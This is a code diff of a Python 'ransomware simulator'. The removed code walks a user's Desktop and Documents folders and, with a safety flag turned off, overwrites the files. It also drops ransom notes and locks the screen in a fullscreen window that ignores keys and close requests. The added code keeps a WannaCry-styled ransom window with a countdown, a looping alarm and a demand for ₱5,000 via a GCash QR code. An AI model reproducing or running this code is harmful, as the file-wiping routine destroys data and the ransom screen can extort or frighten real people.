@@ -210,177 +210,115 @@ from threading import Thread
 from PIL import Image, ImageTk
 
 # ===== CONFIG =====
-TARGET_DIRS = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents"), "C:\\Temp"]
-FAKE_EXT, RANSOM_NOTE = ".locked", "README_RESTORE.txt"
-VICTIM_ID, SIM_DURATION = f"GC-{random.randint(10000,99999)}", 40
-SAVE_DIR = os.path.expanduser("~/Desktop")
-ALARM_FILE, QR_FILE = "Alert2.wav", "qr.jpg"   # use your files placed beside this script
-SAFE_MODE = True  # True = safe fake encrypt, False = destructive (VM only!)
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+VICTIM_ID, SIM_DURATION = f"GC-{random.randint(10000,99999)}", 60
+ALARM_FILE = os.path.join(BASE_DIR, "Alert2.wav")
+QR_FILE = os.path.join(BASE_DIR, "qr.jpg")
 # ==================
-
-def _iter_files(roots, max_per_dir=300, walk_depth=1):
-    """Yield file paths from roots; shallow walk for safety."""
-    for root in roots:
-        if not os.path.isdir(root): continue
-        try:
-            for name in os.listdir(root):
-                p = os.path.join(root, name)
-                if os.path.isfile(p): yield p
-        except: pass
-        if walk_depth >= 1:
-            try:
-                for dname in os.listdir(root):
-                    dpath = os.path.join(root, dname)
-                    if os.path.isdir(dpath):
-                        try:
-                            count = 0
-                            for name in os.listdir(dpath):
-                                p = os.path.join(dpath, name)
-                                if os.path.isfile(p):
-                                    yield p
-                                    count += 1
-                                    if count >= max_per_dir: break
-                        except: pass
-            except: pass
-
-def simulate_encryption():
-    """Fake encryption + ransom notes; returns (count, real filenames for GUI)."""
-    count, display_names, seen = 0, [], set()
-    candidates = []
-    for f in _iter_files(TARGET_DIRS):
-        if not f.endswith(FAKE_EXT):
-            base = os.path.basename(f)
-            if base not in seen:
-                seen.add(base)
-                candidates.append(f)
-    for fpath in candidates:
-        try:
-            if SAFE_MODE:
-                new_file = fpath + FAKE_EXT
-                with open(new_file, "w", encoding="utf-8", errors="ignore") as f:
-                    f.write("### ENCRYPTED DATA (SIMULATION) ###\n" + "X" * random.randint(200, 400))
-            else:
-                with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
-                    f.write("### ENCRYPTED DATA ###\n" + "X" * random.randint(500, 800))
-            count += 1
-            display_names.append(os.path.basename(fpath))
-        except: continue
-
-    note_text = f"""--- ALL YOUR FILES HAVE BEEN ENCRYPTED ---
-
-Victim ID: {VICTIM_ID}
-
-All your documents, photos, and databases have been locked.
-
-To restore access, you must pay ₱5,000 via GCash.
-
-Scan the QR code below for payment instructions.
-
-WARNING:
-- Do not attempt to rename or modify files
-- Do not try recovery software
-- Payment must be made within 24 hours
-  or your files will be permanently lost.
-"""
-    for d in TARGET_DIRS:
-        try:
-            if os.path.isdir(d):
-                with open(os.path.join(d, RANSOM_NOTE), "w", encoding="utf-8", errors="ignore") as nf:
-                    nf.write(note_text)
-        except: pass
-
-    return count, display_names
-
-def save_summary(count):
-    path = os.path.join(SAVE_DIR, "ransom_summary.txt")
-    try:
-        with open(path, "w", encoding="utf-8", errors="ignore") as f:
-            f.write(
-                "=== RANSOMWARE SIMULATION REPORT ===\n"
-                f"Victim ID: {VICTIM_ID}\n"
-                f"Files Encrypted: {count}\n"
-                f"Time: {datetime.datetime.now()}\n"
-            )
-        print(f"[+] Summary saved: {path}")
-    except Exception as e:
-        print(f"[!] Could not save summary: {e}")
 
 def play_alert():
     try:
-        pygame.mixer.init()
-        pygame.mixer.music.load(ALARM_FILE)
-        pygame.mixer.music.play(-1)
-        print(f"[+] Playing sound: {ALARM_FILE}")
+        if os.path.exists(ALARM_FILE):
+            pygame.mixer.init()
+            pygame.mixer.music.load(ALARM_FILE)
+            pygame.mixer.music.play(-1)
+        else:
+            print(f"[!] Sound missing: {ALARM_FILE}")
     except Exception as e:
         print(f"[!] Sound error: {e}")
 
-def ransom_gui(count, names_for_gui):
+def ransom_gui():
     root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.configure(bg="#2b2b2b")       # modern dark gray
+    root.title("Wana Decrypt0r Simulator 2.0")
+    root.geometry("720x540")
+    root.resizable(False, False)
+    root.configure(bg="#b30000")   # deep red background
     root.wm_attributes("-topmost", 1)
-    root.protocol("WM_DELETE_WINDOW", lambda: None)
-    root.bind_all("<Key>", lambda e: "break")  # soft lock
 
-    header = tk.Frame(root, bg="#cc0000", height=100)
+    # ===== HEADER =====
+    header = tk.Frame(root, bg="#b30000", height=70)
     header.pack(fill="x")
-    tk.Label(
-        header,
-        text="ALL YOUR FILES HAVE BEEN ENCRYPTED",
-        fg="white", bg="#cc0000", font=("Segoe UI", 36, "bold")
-    ).pack(pady=25)
+    tk.Label(header, text="Ooops, your files have been encrypted!",
+             fg="white", bg="#b30000", font=("Segoe UI", 20, "bold")).pack(pady=15)
 
-    panel = tk.Frame(root, bg="#f4f4f4", padx=40, pady=30)
-    panel.place(relx=0.5, rely=0.55, anchor="center")
+    # ===== MAIN LAYOUT =====
+    body = tk.Frame(root, bg="#f4f4f4", padx=10, pady=10)
+    body.pack(fill="both", expand=True)
 
-    tk.Label(panel, text=f"Victim ID: {VICTIM_ID}", bg="#f4f4f4", font=("Consolas", 16)).pack(pady=5)
-    tk.Label(
-        panel,
-        text=("All your documents, photos, and databases on this computer\n"
-              "have been locked with strong encryption.\n\n"
-              "To restore access, you must pay ₱5,000 via GCash.\n"
-              "Scan the QR code below for payment instructions."),
-        bg="#f4f4f4", font=("Segoe UI", 14), justify="center"
-    ).pack(pady=10)
+    # LEFT PANEL (Warnings + Countdown)
+    left = tk.Frame(body, bg="#990000", width=220, padx=8, pady=8)
+    left.pack(side="left", fill="y")
 
-    try:
-        qr = ImageTk.PhotoImage(Image.open(QR_FILE).resize((260,260)))
-        tk.Label(panel, image=qr, bg="#f4f4f4").pack(pady=10)
-    except:
-        tk.Label(panel, text="[QR IMAGE MISSING]", bg="#f4f4f4", fg="red").pack(pady=10)
+    # Payment raise panel
+    tk.Label(left, text="Payment will be raised on:", bg="#990000", fg="white",
+             font=("Segoe UI", 11, "bold")).pack(pady=5)
+    raise_lbl = tk.Label(left, text="--/--/----", bg="black", fg="lime",
+                         font=("Consolas", 14, "bold"), width=18, height=2)
+    raise_lbl.pack(pady=5)
 
-    countdown = tk.Label(panel, text="", fg="red", bg="#f4f4f4", font=("Consolas", 24, "bold"))
-    countdown.pack(pady=15)
-    progress = tk.Label(panel, text="", fg="green", bg="#f4f4f4", font=("Consolas", 12))
-    progress.pack(pady=10)
+    # Files lost panel
+    tk.Label(left, text="Your files will be lost on:", bg="#990000", fg="white",
+             font=("Segoe UI", 11, "bold")).pack(pady=15)
+    lost_lbl = tk.Label(left, text="--/--/----", bg="black", fg="red",
+                        font=("Consolas", 14, "bold"), width=18, height=2)
+    lost_lbl.pack(pady=5)
 
-    tk.Label(
-        panel,
-        text=("WARNING:\n"
-              "- Do not attempt to rename or modify files\n"
-              "- Do not try recovery software\n"
-              "- Payment must be made within 24 hours\n"
-              "  or your files will be permanently lost."),
-        bg="#f4f4f4", font=("Segoe UI", 11), justify="left"
-    ).pack(pady=20)
+    # ===== RIGHT PANEL (Info + QR) =====
+    right = tk.Frame(body, bg="#f4f4f4")
+    right.pack(side="left", fill="both", expand=True, padx=10)
 
-    start = time.time()
-    pool = names_for_gui[:] if names_for_gui else []
-    while time.time() - start < SIM_DURATION:
-        left = int(SIM_DURATION - (time.time() - start))
-        countdown.config(text=f"Time Left: {left} sec")
-        if pool:
-            progress.config(text=f"Encrypting {random.choice(pool)}...")
-        else:
-            progress.config(text=f"Encrypting {random.choice(['Report.docx','Photos.zip','ClientDB.mdb','Backup.pptx'])}...")
-        root.update(); time.sleep(0.5)
+    # Victim ID
+    tk.Label(right, text=f"Victim ID: {VICTIM_ID}", font=("Consolas", 12), bg="#f4f4f4").pack(anchor="w")
 
-    root.destroy(); save_summary(count)
+    # Instructions
+    instr = ("What Happened to My Computer?\n\n"
+             "All your important files are encrypted.\n"
+             "To restore access, you must pay ₱5,000 via GCash.\n\n"
+             "Can I Recover My Files?\n\n"
+             "Sure. You can recover files safely, but only after payment.\n\n"
+             "How Do I Pay?\n\n"
+             "Payment is accepted in GCash. Scan the QR below and send the amount.\n")
+    tk.Message(right, text=instr, width=400, bg="#f4f4f4", font=("Segoe UI", 10)).pack(anchor="w", pady=5)
+
+    # QR Image
+    if os.path.exists(QR_FILE):
+        qr = ImageTk.PhotoImage(Image.open(QR_FILE).resize((200,200)))
+        tk.Label(right, image=qr, bg="#f4f4f4").pack(pady=10)
+        right.qr_img = qr
+    else:
+        tk.Label(right, text="[QR MISSING]", fg="red", bg="#f4f4f4").pack(pady=10)
+
+    # Payment details
+    pay_frame = tk.Frame(right, bg="#ffcc00", padx=10, pady=5)
+    pay_frame.pack(fill="x", pady=10)
+    tk.Label(pay_frame, text="Send ₱5,000 worth to this GCash QR!", bg="#ffcc00",
+             fg="black", font=("Consolas", 11, "bold")).pack()
+
+    # ===== FOOTER (Countdown + Buttons) =====
+    footer = tk.Frame(root, bg="#b30000", height=50)
+    footer.pack(side="bottom", fill="x")
+
+    countdown_lbl = tk.Label(footer, text="Time Left: -- sec", fg="white", bg="#b30000",
+                             font=("Consolas", 16, "bold"))
+    countdown_lbl.pack(pady=5)
+
+    def update_countdown():
+        start = time.time()
+        while time.time() - start < SIM_DURATION:
+            left = int(SIM_DURATION - (time.time() - start))
+            countdown_lbl.config(text=f"Time Left: {left} sec")
+            raise_lbl.config(text="08/26/2025 10:00 AM ")
+            lost_lbl.config(text="08/26/2025 10:10 AM")
+            root.update()
+            time.sleep(1)
+        root.destroy()
+
+    Thread(target=update_countdown, daemon=True).start()
+    root.mainloop()
 
 def main():
-    count, display_names = simulate_encryption()
     Thread(target=play_alert, daemon=True).start()
-    ransom_gui(count, display_names)
+    ransom_gui()
 
 if __name__ == "__main__":
     main()
